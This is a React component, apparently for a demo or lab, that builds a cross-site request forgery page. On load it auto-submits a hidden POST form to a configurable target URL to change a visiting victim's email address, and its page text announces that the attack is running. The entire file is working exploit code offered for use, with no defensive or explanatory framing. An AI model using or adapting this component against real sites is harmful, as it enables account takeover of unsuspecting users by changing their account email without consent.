import React, { useEffect } from "react";

const CSRFExploitForm = ({ exploitUrl, newEmail }) => {
  useEffect(() => {
    // Auto-submit the exploit form
    document.getElementById("csrf-form").submit();
  }, []);

  return (
    <div className="text-center p-4">
      <h3>CSRF Attack Running...</h3>
      <p>
        If the victim visits this page, their email will be changed
        automatically.
      </p>
      <form id="csrf-form" action={exploitUrl} method="POST">
        <input type="hidden" name="email" value={newEmail} />
        <input type="submit" value="Submit" style={{ display: "none" }} />
      </form>
    </div>
  );
};

export default CSRFExploitForm;
